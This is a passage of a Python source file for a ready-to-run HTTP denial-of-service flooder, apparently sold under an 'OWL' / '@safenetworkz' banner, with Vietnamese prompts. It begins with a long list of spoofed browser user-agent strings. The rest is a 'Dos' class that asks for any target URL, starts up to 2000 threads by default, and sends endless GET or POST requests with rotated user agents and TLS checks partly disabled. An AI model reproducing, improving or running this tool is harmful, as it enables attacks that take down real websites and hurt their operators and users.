	"Mozilla/4.0 WebTV/2.6 (compatible; MSIE 4.0)",
	"Mozilla/4.0 (compatible; MSIE 4.0; Windows NT)",
	"Mozilla/4.0 (compatible; MSIE 4.0; Windows 98 )",
	"Mozilla/4.0 (compatible; MSIE 4.0; Windows 95; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
	"Mozilla/4.0 (compatible; MSIE 4.0; Windows 95)",
	"Mozilla/4.0 (Compatible; MSIE 4.0)",
	"Mozilla/2.0 (compatible; MSIE 4.0; Windows 98)",
	"Mozilla/2.0 (compatible; MSIE 3.03; Windows 3.1)",
	"Mozilla/2.0 (compatible; MSIE 3.02; Windows 3.1)",
	"Mozilla/2.0 (compatible; MSIE 3.01; Windows 95)",
	"Mozilla/2.0 (compatible; MSIE 3.01; Windows 95)",
	"Mozilla/2.0 (compatible; MSIE 3.0B; Windows NT)",
	"Mozilla/3.0 (compatible; MSIE 3.0; Windows NT 5.0)",
	"Mozilla/2.0 (compatible; MSIE 3.0; Windows 95)",
	"Mozilla/2.0 (compatible; MSIE 3.0; Windows 3.1)",
	"Mozilla/4.0 (compatible; MSIE 2.0; Windows NT 5.0; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)",
	"Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)",
	"Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)",
	"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16",
	"Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
	"Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
	"Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02",
	"Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00",
	"Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00",
	"Opera/12.0(Windows NT 5.2;U;en)Presto/22.9.168 Version/12.00",
	"Opera/12.0(Windows NT 5.1;U;en)Presto/22.9.168 Version/12.00",
	"Mozilla/5.0 (Windows NT 5.1) Gecko/20100101 Firefox/14.0 Opera/12.0",
	"Opera/9.80 (Windows NT 6.1; WOW64; U; pt) Presto/2.10.229 Version/11.62",
	"Opera/9.80 (Windows NT 6.0; U; pl) Presto/2.10.229 Version/11.62",
	"Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52",
	"Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; de) Presto/2.9.168 Version/11.52",
	"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.9.168 Version/11.51",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; de) Opera 11.51",
	"Opera/9.80 (X11; Linux x86_64; U; fr) Presto/2.9.168 Version/11.50",
	"Opera/9.80 (X11; Linux i686; U; hu) Presto/2.9.168 Version/11.50",
	"Opera/9.80 (X11; Linux i686; U; ru) Presto/2.8.131 Version/11.11",
	"Opera/9.80 (X11; Linux i686; U; es-ES) Presto/2.8.131 Version/11.11",
	"Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.1) Gecko/20061208 Firefox/5.0 Opera 11.11",
	"Opera/9.80 (X11; Linux x86_64; U; bg) Presto/2.8.131 Version/11.10",
	"Opera/9.80 (Windows NT 6.0; U; en) Presto/2.8.99 Version/11.10",
	"Opera/9.80 (Windows NT 5.1; U; zh-tw) Presto/2.8.131 Version/11.10",
	"Opera/9.80 (Windows NT 6.1; Opera Tablet/15165; U; en) Presto/2.8.149 Version/11.1",
	"Opera/9.80 (X11; Linux x86_64; U; Ubuntu/10.10 (maverick); pl) Presto/2.7.62 Version/11.01",
	"Opera/9.80 (X11; Linux i686; U; ja) Presto/2.7.62 Version/11.01",
	"Opera/9.80 (X11; Linux i686; U; fr) Presto/2.7.62 Version/11.01",
	"Opera/9.80 (Windows NT 6.1; U; zh-tw) Presto/2.7.62 Version/11.01",
	"Opera/9.80 (Windows NT 6.1; U; zh-cn) Presto/2.7.62 Version/11.01",
	"Opera/9.80 (Windows NT 6.1; U; sv) Presto/2.7.62 Version/11.01",
	"Opera/9.80 (Windows NT 6.1; U; en-US) Presto/2.7.62 Version/11.01",
    ]

    amount = 0
    USER_AGENT = ""

    def __init__(self, seq, type):
        self.seq = seq
        self.type = type

    def run(self):
        try:
            while True:
                if self.type == 1:
                    self.postAttack(Dos.url)
                elif self.type == 2:
                    self.sslPostAttack(Dos.url)
                elif self.type == 3:
                    self.getAttack(Dos.url)
                elif self.type == 4:
                    self.sslGetAttack(Dos.url)
        except Exception:
            pass

    @staticmethod
    def main():
        url = ""
        Dos.amount = 0
        dos = Dos(0, 0)
        url = input("Nhập URL: ")
        print("\nBắt đầu Attack vào URL:", url)

        parsed_url = urlparse(url)

        print("Kiểm tra kết nối đến trang web")
        if parsed_url.scheme == "http":
            dos.checkConnection(url)
        else:
            dos.sslCheckConnection(url)

        print(" Copyright 2023 [OWL 🦉]")
        print(" Buy Tools | @safenetworkz")

        amount = input("Vui Lòng Nhập Threads Max(2000): ")
        if amount is None or amount == "":
            Dos.amount = 2000
        else:
            Dos.amount = int(amount)

        option = input("Phương Thức (get/port): ")
        ioption = 1
        if option.lower() == "get":
            if parsed_url.scheme == "http":
                ioption = 3
            else:
                ioption = 4
        else:
            if parsed_url.scheme == "http":
                ioption = 1
            else:
                ioption = 2

        time.sleep(2)

        print("Bắt đầu Tấn Công 💀💀💀")
        threads = []
        for i in range(Dos.amount):
            t = threading.Thread(target=Dos(i, ioption).run)
            t.start()
            threads.append(t)

        for t in threads:
            t.join()

        print("Attack Kết Thúc Do Connect Tới Web Thất Bại")

    def checkConnection(self, url):
        print("Kiểm tra kết nối")
        try:
            self.USER_AGENT = random.choice(self.USER_AGENTS)
            headers = {"User-Agent": self.USER_AGENT}
            response = requests.get(url, headers=headers, verify=False)
            if response.status_code == 200:
                print("Kết nối thành công với trang web")
            Dos.url = url
        except requests.exceptions.RequestException as e:
            print("Kết nối thất bại:", str(e))

    def sslCheckConnection(self, url):
        print("Kiểm tra kết nối (SSL)")
        try:
            self.USER_AGENT = random.choice(self.USER_AGENTS)
            headers = {"User-Agent": self.USER_AGENT}
            response = requests.get(url, headers=headers, verify=True)
            if response.status_code == 200:
                print("Kết nối thành công với trang web")
            Dos.url = url
        except requests.exceptions.RequestException as e:
            print("Kết nối thất bại:", str(e))

    def postAttack(self, url):
        try:
            self.USER_AGENT = random.choice(self.USER_AGENTS)
            headers = {"User-Agent": self.USER_AGENT, "Accept-Language": "en-US,en"}
            response = requests.post(url, data=b"out of memory", headers=headers, verify=False)
            print("Attack POST hoàn thành!!:", response.status_code, "Threads:", self.seq)
        except requests.exceptions.RequestException as e:
            print("Attack POST không thành công:", str(e))

    def getAttack(self, url):
        try:
            self.USER_AGENT = random.choice(self.USER_AGENTS)
            headers = {"User-Agent": self.USER_AGENT}
            response = requests.get(url, headers=headers, verify=False)
            print("Attack GET hoàn thành!!:", response.status_code, "Threads:", self.seq)
        except requests.exceptions.RequestException as e:
            print("Attack GET không thành công:", str(e))

    def sslPostAttack(self, url):
        try:
            self.USER_AGENT = random.choice(self.USER_AGENTS)
            headers = {"User-Agent": self.USER_AGENT, "Accept-Language": "en-US,en"}
            response = requests.post(url, data=b"out of memory", headers=headers, verify=True)
            print("Attack POST hoàn thành!!:", response.status_code, "Threads:", self.seq)
        except requests.exceptions.RequestException as e:
            print("Attack POST không thành công:", str(e))

    def sslGetAttack(self, url):
        try:
            self.USER_AGENT = random.choice(self.USER_AGENTS)
            headers = {"User-Agent": self.USER_AGENT}
            response = requests.get(url, headers=headers, verify=True)
            print("Attack GET hoàn thành!!:", response.status_code, "Threads:", self.seq)
        except requests.exceptions.RequestException as e:
            print("Attack GET không thành công:", str(e))


if __name__ == "__main__":
    Dos.main()
                